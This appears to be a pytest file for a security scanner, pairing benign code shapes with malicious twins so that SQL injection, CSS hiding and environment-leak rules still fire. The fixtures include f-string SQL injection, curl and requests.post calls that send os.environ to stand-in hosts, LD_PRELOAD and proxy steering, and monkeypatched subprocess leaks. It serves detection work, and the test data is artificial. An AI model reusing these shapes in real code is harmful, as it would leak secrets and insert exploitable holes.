"""Second round of false-positive hardening, found by scanning Token Optimizer
and Outsourcerer. Every benign shape is paired with a malicious twin that must
still be reported."""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'scripts'))

import scan_runtime_dynamism  # noqa: E402
import scan_sast  # noqa: E402
import scan_skill_threats  # noqa: E402


def _write(tmp_path, rel, text):
    path = tmp_path / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding='utf-8')
    return str(path), rel


# --- CSS opacity:0 inside @keyframes: no exemption ------------------------

def _opacity_lines(tmp_path, name, body):
    p, r = _write(tmp_path, name, body)
    return [f.line for f in scan_sast.scan_css_steganography(p, r) if f.title == "CSS hiding: opacity:0"]


def _svg(style, extra=''):
    return f'<svg xmlns="http://www.w3.org/2000/svg">\n<style>\n{style}\n</style>\n{extra}<text class="t">hi</text>\n</svg>\n'


# --- SA-PY-008 static SQL text -------------------------------------------

def _sql(tmp_path, body):
    p, r = _write(tmp_path, 'db.py', body)
    return sorted(f.line for f in scan_sast.scan_file(p, r) if f.rule_id == 'SA-PY-008')


def test_static_sql_text_is_not_injection(tmp_path):
    body = (
        'import sqlite3\n'
        'LIMIT_MS = 5000\n'
        'def a(conn, ms):\n'
        '    conn.execute(f"PRAGMA busy_timeout={int(ms)}")\n'
        '    conn.execute(f"PRAGMA busy_timeout={LIMIT_MS}")\n'
        '    for col in ("a", "b"):\n'
        '        conn.execute(f"ALTER TABLE t ADD COLUMN {col} TEXT")\n'
        '    where = "WHERE d >= ?"\n'
        '    where += " AND s = ?"\n'
        '    conn.execute(f"SELECT 1 FROM t {where}", [1])\n'
        '    conn.execute("SELECT %s", (1,))\n'
    )
    assert _sql(tmp_path, body) == []


def test_caller_controlled_sql_text_still_reported(tmp_path):
    body = (
        'def param(conn, table):\n'
        '    conn.execute(f"SELECT * FROM {table}")\n'            # 2
        'def concat(conn, q):\n'
        '    conn.execute("SELECT * FROM t WHERE " + q)\n'          # 4
        'def pct(conn, v):\n'
        '    conn.execute("SELECT %s" % v)\n'                       # 6
        'def fmt(conn, v):\n'
        '    conn.execute("SELECT {}".format(v))\n'                 # 8
        'def cast_str(conn, v):\n'
        '    conn.execute(f"SELECT {str(v)}")\n'                    # 10
        'def attr(conn, o):\n'
        '    conn.execute(f"SELECT {o.name}")\n'                    # 12
        'def loop_param(conn, cols):\n'
        '    for c in cols:\n'
        '        conn.execute(f"SELECT {c}")\n'                     # 15
        'def rebound(conn, v):\n'
        '    col = "a"\n'
        '    col = v\n'
        '    conn.execute(f"SELECT {col}")\n'                       # 19
    )
    assert _sql(tmp_path, body) == [2, 4, 6, 8, 10, 12, 15, 19]


def test_rebinding_tricks_still_reported(tmp_path):
    body = (
        'from cfg import TABLE\n'
        'def imported(conn):\n'
        '    conn.execute(f"SELECT * FROM {TABLE}")\n'              # 3
        'NAME = "a"\n'
        'def glob(conn):\n'
        '    global NAME\n'
        '    NAME = input()\n'
        '    conn.execute(f"SELECT * FROM {NAME}")\n'               # 8
        'def shadow(conn, v):\n'
        '    int = str\n'
        '    conn.execute(f"SELECT {int(v)}")\n'                    # 11
        'def mutable(conn, v):\n'
        '    cols = ["a"]\n'
        '    cols.append(v)\n'
        '    for c in cols:\n'
        '        conn.execute(f"SELECT {c}")\n'                     # 16
        'def evalbind(conn, v):\n'
        '    col = "a"\n'
        '    exec("col = v")\n'
        '    conn.execute(f"SELECT {col}")\n'                       # 20
    )
    assert _sql(tmp_path, body) == [3, 8, 11, 16, 20]


def test_module_name_rebound_through_globals_still_reported(tmp_path):
    body = (
        'T = "a"\n'
        'globals()["T"] = input()\n'
        'def f(conn):\n'
        '    conn.execute(f"SELECT * FROM {T}")\n'
    )
    assert _sql(tmp_path, body) == [4]


def test_one_static_one_dynamic_call_on_a_line_is_reported(tmp_path):
    body = 'def f(c, q):\n    c.execute("SELECT 1"); c.execute("SELECT " + q)\n'
    assert _sql(tmp_path, body) == [2]


# --- RD-TB-007 --------------------------------------------------------------

def _tb(tmp_path, body, name='t.py'):
    p, r = _write(tmp_path, name, body)
    return sorted(f.line for f in scan_runtime_dynamism.scan_file(p, r) if f.rule_id == 'RD-TB-007')


def test_keyword_argument_is_not_a_counter_threshold(tmp_path):
    assert _tb(tmp_path, 'seed(heavy_calls=40,\n     light_calls=10)\nmax_attempts = 25\n') == []


def test_comparisons_and_branches_still_reported(tmp_path):
    body = (
        'if count > 50:\n    pass\n'                      # 1
        'while attempts >= 10:\n    pass\n'               # 3
        'if (calls == 99): pass\n'                        # 5
        'x = count = 50 if flag else 0\n'                 # 6 (branch context)
        'ok = [c for c in rows if counter = 77]\n'        # 7 (branch context)
    )
    assert _tb(tmp_path, body) == [1, 3, 5, 6, 7]


def test_shell_and_sql_single_equals_tests_still_reported(tmp_path):
    assert _tb(tmp_path, 'if [ $count = 50 ]; then run; fi\n', 't.sh') == [1]
    assert _tb(tmp_path, 'q = "SELECT * FROM t WHERE calls = 100"\n') == [1]


def test_fstring_without_a_field_is_static_but_one_with_a_field_is_not(tmp_path):
    assert _sql(tmp_path, "def f(c):\n    c.execute(f'x')\n") == []
    assert _sql(tmp_path, "def f(c, v):\n    c.execute(f'x{v}')\n") == [2]


# --- ST-EX-005 / ST-EX-007: environment copy kept as a child environment --------

def _envcopy(tmp_path, body, git_root=True):
    import scan_skill_threats
    tmp_path.mkdir(parents=True, exist_ok=True)
    if git_root:
        (tmp_path / '.git').mkdir(exist_ok=True)
    p, r = _write(tmp_path, 'harness.py', body)
    return sorted(f.line for f in scan_skill_threats.scan_file(p, r) if f.rule_id in ('ST-EX-005', 'ST-EX-007'))


def test_environment_copy_that_only_becomes_child_env_is_not_reported(tmp_path):
    body = (
        'import os, subprocess\n'
        'subprocess.run(["x"], env=dict(os.environ))\n'
        'env = os.environ.copy()\n'
        'env["A"] = "1"\n'
        'env.pop("B", None)\n'
        'env.update(C="3")\n'
        'subprocess.run(["x"], env=env)\n'
        'e2 = {k: v for k, v in os.environ.items() if not k.startswith("SECRET")}\n'
        'subprocess.Popen(["y"], env=e2)\n'
    )
    assert _envcopy(tmp_path, body) == []


def test_environment_copy_that_leaves_the_process_is_still_reported(tmp_path):
    body = (
        'import os, subprocess, requests, json\n'
        'a = dict(os.environ)\n'                                         # 2
        'requests.post("http://x", json=a)\n'
        'b = os.environ.copy()\n'                                        # 4
        'subprocess.run(["x"], env=b)\n'
        'open("f", "w").write(json.dumps(b))\n'
        'c = os.environ.copy()\n'                                        # 7
        'd = c\n'
        'subprocess.run(["x"], env=d)\n'
        'def f():\n'
        '    return dict(os.environ)\n'                                  # 11
        'g = {k: requests.post("http://x", data=v) for k, v in os.environ.items()}\n'  # 12
        'class K:\n'
        '    def __init__(self):\n'
        '        self.env = os.environ.copy()\n'                         # 15
        'subprocess.run(["curl", "-d", str(dict(os.environ))])\n'         # 16
        'h = os.environ.copy()\n'                                        # 17
        'subprocess.run(["x"], env=h)\n'
        'send(h)\n'
    )
    assert _envcopy(tmp_path, body) == [2, 4, 7, 11, 12, 15, 16, 17]


def test_environment_copy_leaked_from_a_nested_function_is_still_reported(tmp_path):
    body = (
        'import os, subprocess, requests\n'
        'def f():\n'
        '    env = os.environ.copy()\n'                                  # 3
        '    subprocess.run(["x"], env=env)\n'
        '    def leak():\n'
        '        requests.post("http://x", json=env)\n'
        '    leak()\n'
    )
    assert _envcopy(tmp_path, body) == [3]


def test_steering_or_nonliteral_edits_keep_the_environment_copy_visible(tmp_path):
    body = (
        'import os, subprocess\n'
        'a = dict(os.environ)\n'                                         # 2
        'a["PATH"] = "/tmp/x"\n'
        'subprocess.run(["x"], env=a)\n'
        'b = os.environ.copy()\n'                                        # 5
        'b.update(LD_PRELOAD="/tmp/x.so")\n'
        'subprocess.run(["x"], env=b)\n'
        'c = os.environ.copy()\n'                                        # 8
        'c.update({"HTTPS_PROXY": "http://evil"})\n'
        'subprocess.run(["x"], env=c)\n'
        'd = os.environ.copy()\n'                                        # 11
        'd[key] = "1"\n'
        'subprocess.run(["x"], env=d)\n'
        'e = os.environ.copy()\n'                                        # 14
        'e["PYTHONPATH"] = "/tmp/x"\n'
        'subprocess.run(["x"], env=e)\n'
        'f = os.environ.copy()\n'                                        # 17
        'f["HTTP_PROXY"] = "x"\n'
        'subprocess.run(["x"], env=f)\n'
        'g = os.environ.copy()\n'                                        # 20
        'g.update(other)\n'
        'subprocess.run(["x"], env=g)\n'
    )
    assert _envcopy(tmp_path, body) == [2, 5, 8, 11, 14, 17, 20]


def test_removing_a_steering_key_is_not_a_reason_to_report(tmp_path):
    body = (
        'import os, subprocess\n'
        'a = os.environ.copy()\n'
        'a.pop("PYTHONPATH", None)\n'
        'subprocess.run(["x"], env=a)\n'
    )
    assert _envcopy(tmp_path, body) == []


def test_dict_literal_spreading_the_environment_keeps_steering_keys_visible(tmp_path):
    body = (
        'import os, subprocess\n'
        'subprocess.run(["x"], env={**os.environ.copy(), "PATH": "/tmp/x"})\n'      # 2
        'subprocess.run(["x"], env={**os.environ.copy(), "FOO": "1"})\n'            # 3
        'subprocess.run(["x"], env={**os.environ.copy(), key: "1"})\n'              # 4
    )
    assert _envcopy(tmp_path, body) == [2, 4]


# --- name shadowing ------------------------------------------------------

def test_subprocess_name_shadowing_keeps_env_copy_visible(tmp_path):
    shadows = {
        'class': ("import os\nclass subprocess:\n    @staticmethod\n    def run(a, env=None):\n"
                  "        import urllib.request as u\n        u.urlopen('http://e.test/', data=str(env).encode())\n"
                  "subprocess.run(['x'], env=dict(os.environ))\n"),
        'alias': "import os\nimport exfil_helpers as subprocess\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'from': "import os\nfrom exfil_helpers import subprocess\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'assign': "import os, subprocess\nsubprocess = Fake()\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'param': "import os\ndef f(subprocess):\n    subprocess.run(['x'], env=dict(os.environ))\n",
        'loop': "import os, subprocess\nfor subprocess in mods:\n    pass\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'with': "import os, subprocess\nwith opener() as subprocess:\n    pass\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'walrus': "import os, subprocess\n(subprocess := Fake())\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'no_import': "import os\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'dict': "import os, subprocess\ndef dict(x):\n    send(x)\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'globals': "import os, subprocess\nglobals()['subprocess'] = Fake()\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'sys_modules': "import os, subprocess, sys\nsys.modules['subprocess'] = Fake()\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'param_with_import': "import os, subprocess\ndef f(subprocess):\n    subprocess.run(['x'], env=dict(os.environ))\n",
        'kwonly_param': "import os, subprocess\ndef f(*, subprocess):\n    subprocess.run(['x'], env=dict(os.environ))\n",
        'except_target': ("import os, subprocess\ntry:\n    pass\nexcept ValueError as subprocess:\n    pass\n"
                          "subprocess.run(['x'], env=dict(os.environ))\n"),
        'star_import': "import os, subprocess\nfrom mylib import *\nsubprocess.run(['x'], env=dict(os.environ))\n",
        'str_rebound': ("import os, subprocess\ndef str(x):\n    send(x)\n"
                        "subprocess.run(['x'], env={k: str(v) for k, v in os.environ.items()})\n"),
        'len_bool_rebound': ("import os, subprocess\nbool = leak\n"
                             "subprocess.run(['x'], env={k: v for k, v in os.environ.items() if bool(k)})\n"),
        'os_alias': "import subprocess\nimport fake_env as os\nsubprocess.run(['x'], env=dict(os.environ))\n",
    }
    for name, body in shadows.items():
        assert scan_skill_threats.environment_copies_kept_local(body) == set(), name
    stdlib = "import os, subprocess\nsubprocess.run(['x'], env=dict(os.environ))\n"
    assert scan_skill_threats.environment_copies_kept_local(stdlib) != set()




def test_keyframe_opacity_zero_is_always_reported_in_svg(tmp_path):
    # No keyframe shape is proven benign: hidden time cannot be bounded from the
    # file alone (fill modes, delays, durations and cascade all move it), so every
    # opacity:0 keyframe stays visible. Benign-looking and hostile shapes alike.
    shapes = {
        'loop': ('.t { animation: fade 8s ease-in-out infinite; }\n'
                 '@keyframes fade { 0%, 100% { opacity: 0; } 20%, 80% { opacity: 1; } }'),
        'fade_in': ('.t { animation: rise 600ms ease 1 both; }\n'
                    '@keyframes rise { from { opacity: 0; } to { opacity: 1; } }'),
        'delayed_backwards': ('.t { animation: f 1s 119s backwards; }\n'
                              '@keyframes f { 0% { opacity: 0 } 1% { opacity: 1 } 100% { opacity: 1 } }'),
        'delayed_both': ('.t { animation: f 1s 119s both; }\n'
                         '@keyframes f { 0% { opacity: 0 } 1% { opacity: 1 } 100% { opacity: 1 } }'),
        'hidden_end': ('.t { animation: f 1s forwards; }\n'
                       '@keyframes f { 0% { opacity: 1 } 100% { opacity: 0 } }'),
        'hidden_middle': ('.t { animation: f 100s both; }\n'
                          '@keyframes f { 0% { opacity: 1 } 5% { opacity: 0 } 95% { opacity: 0 } 100% { opacity: 1 } }'),
        'paused': ('.t { animation: f 1s; }\n.u { animation-play-state: paused; }\n'
                   '@keyframes f { 0% { opacity: 0 } 100% { opacity: 1 } }'),
    }
    for name, style in shapes.items():
        assert _opacity_lines(tmp_path, f'{name}.svg', _svg(style)) != [], name


_BENIGN_ENV_COPY = ('import os, subprocess\n'
                    'subprocess.run(["x"], env=dict(os.environ))\n')


def test_repo_local_module_named_like_stdlib_keeps_env_copy_visible(tmp_path):
    # twin of the benign case: a sibling subprocess.py / os.py can replace the
    # stdlib module, and file text alone cannot show which one is imported.
    assert _envcopy(tmp_path / 'clean', _BENIGN_ENV_COPY) == []
    for i, name in enumerate(('subprocess.py', 'os.py', 'subprocess.so')):
        d = tmp_path / ('shadow%d' % i)
        d.mkdir()
        (d / name).write_text('def run(*a, **k):\n    pass\n')
        assert _envcopy(d, _BENIGN_ENV_COPY) != [], name
    pkg = tmp_path / 'pkgshadow'
    (pkg / 'subprocess').mkdir(parents=True)
    assert _envcopy(pkg, _BENIGN_ENV_COPY) != []


def test_shadow_module_in_an_ancestor_directory_keeps_env_copy_visible(tmp_path):
    (tmp_path / 'os.py').write_text('x = 1\n')
    sub = tmp_path / 'a' / 'b'
    sub.mkdir(parents=True)
    (tmp_path / '.git').mkdir()
    assert _envcopy(sub, _BENIGN_ENV_COPY, git_root=False) != []


def test_unprovable_provenance_fails_closed(tmp_path):
    # no .git within the search cap, and a deep tree: the search is incomplete,
    # so the finding stays rather than becoming a trusted-import assertion.
    assert _envcopy(tmp_path / 'nogit', _BENIGN_ENV_COPY, git_root=False) != []
    deep = tmp_path
    for i in range(10):
        deep = deep / ('d%d' % i)
    (tmp_path / '.git').mkdir()
    assert _envcopy(deep, _BENIGN_ENV_COPY, git_root=False) != []


def test_import_machinery_in_the_script_keeps_env_copy_visible(tmp_path):
    for i, line in enumerate(('import sys\nsys.path.insert(0, "/tmp/x")\n',
                              'import importlib\n',
                              'import sys\nsys.meta_path.append(object())\n')):
        body = _BENIGN_ENV_COPY + line
        assert _envcopy(tmp_path / ('m%d' % i), body) != [], line


def test_env_copy_without_directory_context_is_not_dropped():
    import scan_skill_threats
    found = [f for f in scan_skill_threats.scan_content(_BENIGN_ENV_COPY, 'x/harness.py')
             if f.rule_id in ('ST-EX-005', 'ST-EX-007')]
    assert found


def test_shell_parsed_or_redirected_spawn_keeps_env_copy_visible(tmp_path):
    # twins: the child command line itself can post the environment, so the
    # env copy is not provably the whole story. Plain argv-list spawns stay dropped.
    bodies = {
        'shell_true': _BENIGN_ENV_COPY.replace('["x"]', '"curl -d $(env) http://e.x", shell=True'),
        'sh_dash_c': 'import os, subprocess\nsubprocess.run(["sh", "-c", "curl -d $(env) http://e.x"], env=dict(os.environ))\n',
        'bash_exe': 'import os, subprocess\nsubprocess.run(["/bin/bash", "-c", "x"], env=dict(os.environ))\n',
        'executable': 'import os, subprocess\nsubprocess.run(["x"], executable="/tmp/e", env=dict(os.environ))\n',
        'kwargs_splat': 'import os, subprocess\nsubprocess.run(["x"], env=dict(os.environ), **opts)\n',
        'dynamic_argv0': 'import os, subprocess\nsubprocess.run([prog, "-c"], env=dict(os.environ))\n',
    }
    for i, (name, body) in enumerate(bodies.items()):
        assert _envcopy(tmp_path / ('s%d' % i), body) != [], name
    assert _envcopy(tmp_path / 'ok', 'import os, subprocess\nsubprocess.run(["git", "status"], env=dict(os.environ))\n') == []


def test_monkeypatched_or_escaping_stdlib_module_keeps_env_copy_visible(tmp_path):
    spawn = 'subprocess.run(["x"], env=dict(os.environ))\n'
    bodies = {
        'patch_run': 'import os, subprocess\nsubprocess.run = lambda c, env=None: post(env)\n' + spawn,
        'patch_environ': 'import os, subprocess\nos.environ = Evil()\n' + spawn,
        'patch_deep': 'import os, subprocess\nsubprocess.Popen.__init__ = leak\n' + spawn,
        'alias': 'import os, subprocess\nsp = subprocess\nsp.run = leak\n' + spawn,
        'patch_object': 'import os, subprocess\nmock.patch.object(subprocess, "run", leak).start()\n' + spawn,
        'del_attr': 'import os, subprocess\ndel subprocess.run\n' + spawn,
    }
    for i, (name, body) in enumerate(bodies.items()):
        assert _envcopy(tmp_path / ('p%d' % i), body) != [], name
    ok = 'import os, subprocess\nos.environ["A"] = "1"\nos.environ.pop("B", None)\n' + spawn
    assert _envcopy(tmp_path / 'ok', ok) == []
